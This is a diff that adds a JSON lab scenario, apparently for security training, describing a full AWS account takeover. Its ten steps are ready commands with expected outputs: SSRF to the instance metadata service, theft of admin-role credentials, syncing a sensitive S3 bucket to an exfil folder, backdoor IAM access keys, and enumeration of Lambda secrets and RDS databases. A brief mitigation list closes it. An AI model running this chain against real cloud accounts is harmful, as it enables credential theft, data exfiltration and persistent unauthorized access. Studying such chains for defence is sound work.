@@ -1,0 +1,116 @@
+{
+  "title": "AWS Account Takeover via SSRF and Metadata Service",
+  "description": "Complete AWS compromise chain from SSRF to full account takeover via metadata service exploitation",
+  "difficulty": "advanced",
+  "estimated_time": "90 minutes",
+  "tools_used": [
+    "aws-cli",
+    "curl",
+    "pacu"
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "title": "SSRF Discovery",
+      "command": "curl -X POST http://target.com/api/fetch -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'",
+      "explanation": "Exploit SSRF vulnerability to access AWS metadata service",
+      "expected_output": "ami-id, iam/, instance-id - metadata accessible",
+      "success_criteria": "Metadata service responding"
+    },
+    {
+      "step": 2,
+      "title": "IAM Role Enumeration",
+      "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "explanation": "List available IAM roles attached to EC2 instance",
+      "expected_output": "web-server-role, admin-role",
+      "success_criteria": "IAM roles discovered"
+    },
+    {
+      "step": 3,
+      "title": "Credential Extraction",
+      "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role",
+      "explanation": "Extract temporary AWS credentials from metadata",
+      "expected_output": "AccessKeyId: ASIA..., SecretAccessKey, SessionToken",
+      "success_criteria": "Full credentials obtained"
+    },
+    {
+      "step": 4,
+      "title": "Configure AWS CLI",
+      "command": "export AWS_ACCESS_KEY_ID=ASIA... && export AWS_SECRET_ACCESS_KEY=... && export AWS_SESSION_TOKEN=... && aws sts get-caller-identity",
+      "explanation": "Configure stolen credentials and verify access",
+      "expected_output": "Account: 123456789012, Arn: arn:aws:sts::123456789012:assumed-role/admin-role",
+      "success_criteria": "Credentials validated"
+    },
+    {
+      "step": 5,
+      "title": "S3 Enumeration",
+      "command": "aws s3 ls",
+      "explanation": "List all S3 buckets in account",
+      "expected_output": "6 buckets: prod-data, backups, sensitive-docs",
+      "success_criteria": "Buckets enumerated"
+    },
+    {
+      "step": 6,
+      "title": "Data Exfiltration",
+      "command": "aws s3 sync s3://sensitive-docs ./exfil/",
+      "explanation": "Download sensitive data from S3 bucket",
+      "expected_output": "2,847 files (8.4GB) downloaded",
+      "success_criteria": "Data exfiltrated"
+    },
+    {
+      "step": 7,
+      "title": "EC2 Discovery",
+      "command": "aws ec2 describe-instances",
+      "explanation": "Enumerate all EC2 instances",
+      "expected_output": "15 instances: web servers, databases, internal tools",
+      "success_criteria": "Infrastructure mapped"
+    },
+    {
+      "step": 8,
+      "title": "Privilege Escalation",
+      "command": "aws iam create-access-key --user-name admin",
+      "explanation": "Create persistent access keys for admin user",
+      "expected_output": "New AccessKeyId: AKIAI44..., SecretAccessKey",
+      "success_criteria": "Backdoor created"
+    },
+    {
+      "step": 9,
+      "title": "Lambda Enumeration",
+      "command": "aws lambda list-functions",
+      "explanation": "Discover Lambda functions with potential secrets",
+      "expected_output": "ProcessPayments function with DB_PASSWORD in environment",
+      "success_criteria": "Credentials in Lambda found"
+    },
+    {
+      "step": 10,
+      "title": "RDS Database Access",
+      "command": "aws rds describe-db-instances",
+      "explanation": "Enumerate RDS databases",
+      "expected_output": "production-mysql publicly accessible, analytics-postgres",
+      "success_criteria": "Database endpoints obtained"
+    }
+  ],
+  "learning_objectives": [
+    "SSRF to AWS metadata exploitation",
+    "IMDSv1 vulnerability",
+    "Temporary credential usage",
+    "AWS CLI reconnaissance",
+    "S3 data exfiltration",
+    "Privilege escalation via IAM",
+    "Persistence mechanisms"
+  ],
+  "mitigation": [
+    "Upgrade to IMDSv2",
+    "Implement SSRF protection",
+    "Use minimal IAM permissions",
+    "Enable CloudTrail logging",
+    "Network segmentation",
+    "Rotate credentials"
+  ],
+  "tags": [
+    "aws",
+    "ssrf",
+    "metadata_service",
+    "privilege_escalation"
+  ]
+}
